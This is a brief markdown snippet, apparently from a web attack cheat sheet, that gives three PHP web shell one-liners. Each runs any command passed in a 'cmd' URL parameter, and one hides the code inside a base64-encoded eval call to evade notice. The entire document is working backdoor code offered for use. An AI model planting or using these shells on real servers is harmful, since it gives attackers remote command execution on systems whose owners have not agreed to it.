# PHP

## Simple 'cmd' exec
```
echo system($_GET['cmd']);
```

### Base64 encoded:
```
eval(base64_decode('ZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsg'));
```

### With if
```
if (isset($_GET["cmd"])) { echo system($_GET['cmd']); }
```
